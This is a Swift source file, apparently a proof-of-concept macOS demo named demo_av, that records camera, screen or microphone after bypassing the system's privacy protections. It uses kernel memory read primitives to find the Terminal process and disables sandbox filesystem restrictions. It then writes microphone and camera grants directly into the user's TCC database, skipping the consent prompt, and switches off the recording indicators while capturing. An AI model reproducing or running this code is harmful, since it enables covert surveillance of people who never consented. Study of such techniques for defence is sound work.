//
//  main.swift
//  demo_av
//
//  Created by sreejith on 3/1/22.
//

import Foundation
import AVFoundation


enum VideoInputSource : String {
    case camera
    case screen
    case none
}


enum AudioInputSource : String {
    case mic
    case none
}


enum CaptureError: Error {
    case noMic
    case badMic
    case micNotAllowed
    case noCamera
    case cameraNotAllowed
    case badCamera
    case outputFileExist
    case timedOut
}


enum CaptureState: Equatable {
    case intialized
    case started
    case stopped
    case error
}


class CaptureSession: NSObject, ObservableObject {
    
    let session = AVCaptureSession()
    let output = AVCaptureMovieFileOutput()
    let outputFile: URL
    
    @Published var state = CaptureState.intialized
    
    init(video: VideoInputSource, audio: AudioInputSource, output: URL) throws {
        outputFile = output
        super.init()
        session.beginConfiguration()
        try configureAudio(audio: audio)
        try configureVideo(video: video)
        try configureOutput()
        session.commitConfiguration()
    }
}


// MARK: Authorization
extension CaptureSession {
    private func checkAuthorization(for mediaType: AVMediaType) -> Bool {
        let status = AVCaptureDevice.authorizationStatus(for: mediaType)
        var authorized = false
        switch status {
        case .notDetermined:
            let sem = DispatchSemaphore(value: 0)
            AVCaptureDevice.requestAccess(for: mediaType) { ok in
                authorized = ok
                sem.signal()
            }
            sem.wait()
        case .restricted:
            authorized = false
        case .denied:
            authorized = false
        case .authorized:
            authorized = true
        @unknown default:
            fatalError()
        }
        return authorized
    }
}


// MARK: Audio
extension CaptureSession {
    private func configureAudio(audio: AudioInputSource) throws {
        switch audio {
        case .mic:
            try self.configureMic()
        case .none:
            break
        }
    }
    
    private func configureMic() throws {
        guard let audioDevice = AVCaptureDevice.default(for: .audio) else {
            throw CaptureError.noMic
        }
        
        guard checkAuthorization(for: .audio) else {
            throw CaptureError.micNotAllowed
        }
        
        guard let audioInput = try? AVCaptureDeviceInput(device: audioDevice) else {
            throw CaptureError.badMic
        }
        
        if (!session.canAddInput(audioInput)) {
            fatalError("cannot add input to session")
        }
        
        session.addInput(audioInput)
    }
}


// MARK: Video
extension CaptureSession {
    private func configureVideo(video: VideoInputSource) throws {
        switch video {
        case .camera:
            try self.configureCamera()
        case .screen:
            try self.configureScreen()
        case .none:
            break
        }
    }
    
    private func configureCamera() throws {
        guard let cameraDevice = AVCaptureDevice.default(for: .video) else {
            throw CaptureError.noCamera
        }
        
        guard checkAuthorization(for: .video) else {
            throw CaptureError.cameraNotAllowed
        }
        
        guard let cameraInput = try? AVCaptureDeviceInput(device: cameraDevice) else {
            throw CaptureError.badCamera
        }
        
        if (!session.canAddInput(cameraInput)) {
            fatalError("cannot add input to session")
        }
        
        session.addInput(cameraInput)
    }
    
    private func configureScreen() throws {
        let screenInput = AVCaptureScreenInput()
        
        if (!session.canAddInput(screenInput)) {
            fatalError("cannot add input to session")
        }
        
        session.addInput(screenInput)
    }
}

// MARK: Output
extension CaptureSession {
    private func configureOutput() throws {
        if FileManager.default.fileExists(atPath: outputFile.path) {
            throw CaptureError.outputFileExist
        }
        
        if (!session.canAddOutput(output)) {
            fatalError("cannot add output to session")
        }
        
        session.addOutput(output)
    }
}

// MARK: Output monitoring
extension CaptureSession: AVCaptureFileOutputRecordingDelegate {
    func fileOutput(_ output: AVCaptureFileOutput, didStartRecordingTo fileURL: URL, from connections: [AVCaptureConnection]) {
        state = .started
    }
    
    func fileOutput(_ output: AVCaptureFileOutput, didPauseRecordingTo fileURL: URL, from connections: [AVCaptureConnection]) {
        fatalError()
    }
    
    func fileOutput(_ output: AVCaptureFileOutput, didResumeRecordingTo fileURL: URL, from connections: [AVCaptureConnection]) {
        fatalError()
    }
    
    func fileOutput(_ output: AVCaptureFileOutput, willFinishRecordingTo fileURL: URL, from connections: [AVCaptureConnection], error: Error?) {
        if let _ = error {
            state = .error
        } else {
            state = .stopped
        }
    }
    
    func fileOutput(_ output: AVCaptureFileOutput, didFinishRecordingTo outputFileURL: URL, from connections: [AVCaptureConnection], error: Error?) {
        debugPrint("file output stopped")
    }
}

// MARK: Controls
extension CaptureSession {
    func start() throws {
        assert(state == .intialized)
        session.startRunning();
        output.startRecording(to: outputFile, recordingDelegate: self)
        let newState = try waitForStateChange(from: .intialized, timeout: DispatchTime.distantFuture)
        assert(newState == .started)
    }
    
    func stop() throws {
        let current = self.state
        assert(current == .started)
        session.stopRunning()
        output.stopRecording()
        _ = try waitForStateChange(from: current, timeout: DispatchTime.now().advanced(by: .seconds(2)))
    }
    
    private func waitForStateChange(from: CaptureState, timeout: DispatchTime) throws -> CaptureState {
        let sem = DispatchSemaphore(value: 0)
        
        var currentState: CaptureState = self.state
        let cancellable = self.$state.sink() { newState in
            if newState != from {
                currentState = newState
                sem.signal()
            }
        }
        
        if currentState == from {
            let res = sem.wait(timeout: timeout)
            if res == .timedOut {
                throw CaptureError.timedOut
            }
        }
        
        cancellable.cancel()
        return currentState
    }
}


// MARK: Utils
func findTerminalProcess() throws -> uintptr_t {
    var cursor: uintptr_t = xe_xnu_proc_current_proc()
    while cursor != 0 {
        let pid = xe_kmem_read_uint32(cursor, UInt(TYPE_PROC_MEM_P_PID_OFFSET))
        
        let binary_path = String(unsafeUninitializedCapacity: Int(PATH_MAX)) { ptr in
            return Int(proc_pidpath(Int32(pid), ptr.baseAddress!, UInt32(PATH_MAX)))
        }
        
        if binary_path == "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal" {
            return cursor
        }
        
        let next = xe_kmem_read_ptr(cursor, UInt(TYPE_PROC_MEM_P_PPTR_OFFSET))
        if next != cursor {
            cursor = next
        } else {
            cursor = 0
        }
    }
    throw POSIXError(.ENOENT)
}


if (CommandLine.argc != 5) {
    print("[E] invalid arguments")
    print("[I] usage: demo_av <path-to-kmem> <none|camera|screen> <none|mic> <path-to-output-file>")
    exit(1)
}

guard let video = VideoInputSource(rawValue: CommandLine.arguments[2]) else {
    print("[E] invalid video mode \(CommandLine.arguments[2]). Should be one of camera, screen or none")
    exit(1)
}

guard let audio = AudioInputSource(rawValue: CommandLine.arguments[3]) else {
    print("[E] invalid audio mode \(CommandLine.arguments[3]). Should be one of mic or none")
    exit(1)
}

if video == .none && audio == .none {
    print("[E] both video and audio is set to none")
    exit(1)
}

let path = CommandLine.arguments[4]

print("[I] initializing kmem")
let kmem_socket = CommandLine.arguments[1]
var kmem_backend = xe_kmem_remote_client_create(kmem_socket)
xe_kmem_use_backend(kmem_backend!)
let mach_execute_header = xe_kmem_remote_client_get_mh_execute_header(kmem_backend)
xe_slider_kernel_init(mach_execute_header)
defer { xe_kmem_remote_client_destroy(&kmem_backend) }

guard let terminal_process = try? findTerminalProcess() else {
    print("[E] parent Terminal process not found. This demo must be run from /System/Applications/Utilities/Terminal.app")
    exit(1)
}

let user_uid = xe_kmem_read_uint32(terminal_process, UInt(TYPE_PROC_MEM_P_UID_OFFSET))
let home_dir = String(cString: getpwuid(user_uid)!.pointee.pw_dir!)
let tcc_database = URL(fileURLWithPath: "Library/Application Support/com.apple.TCC/TCC.db", relativeTo: URL(fileURLWithPath: home_dir)).path

print("[I] using TCC database at", tcc_database)

print("[I] disabling sandbox FS restrictions")
var util_sandbox = xe_util_sandbox_create()
xe_util_sandbox_disable_fs_restrictions(util_sandbox!)

print("[I] authorizing com.apple.Terminal to use kTCCServiceMicrophone")
var error = xe_util_tcc_authorize(tcc_database, "com.apple.Terminal", "kTCCServiceMicrophone")
if error != 0 {
    print("[E] cannot send authorization to TCC.db, err:", error)
    xe_util_sandbox_destroy(&util_sandbox)
    abort()
}

print("[I] authorizing com.apple.Terminal to use kTCCServiceCamera")
error = xe_util_tcc_authorize(tcc_database, "com.apple.Terminal", "kTCCServiceCamera")
if error != 0 {
    print("[E] cannot send authorization to TCC.db, err:", error)
    xe_util_sandbox_destroy(&util_sandbox)
    abort()
}

print("[I] restoring sandbox FS restrictions")
xe_util_sandbox_destroy(&util_sandbox)

print("[I] disabling privacy indicators")
var privacy_disable_session = privacy_disable_session_start()
defer {
    print("[I] restoring privacy indicators")
    privacy_disable_session_stop(&privacy_disable_session)
}

let stopSem = DispatchSemaphore(value: 0)

func stopSignalHandler(_: Int32) {
    print("\n[I] received stop signal")
    stopSem.signal()
}

do {
    let session = try CaptureSession(video: video, audio: audio, output: URL(fileURLWithPath: path))

    try session.start()
    signal(SIGINT, stopSignalHandler)
    
    let cancellable = session.$state.sink { state in
        if state == .error || state == .stopped {
            stopSem.signal()
        }
    }
    
    print("[I] recording started, press Ctrl-C to stop")
    stopSem.wait()
    cancellable.cancel()
    
    try session.stop()
    
    print("[I] recording saved to \(path)")
} catch CaptureError.badMic {
    print("[E] cannot open microphone")
} catch CaptureError.noMic {
    print("[E] no microphone present")
} catch CaptureError.micNotAllowed {
    print("[E] not authorized to use microphone")
} catch CaptureError.badCamera {
    print("[E] cannot open camera")
} catch CaptureError.noCamera {
    print("[E] no camera present")
} catch CaptureError.cameraNotAllowed {
    print("[E] not authorized to use camera")
} catch CaptureError.outputFileExist {
    print("[E] output file already exists")
} catch CaptureError.timedOut {
    print("[E] operation timed out")
}
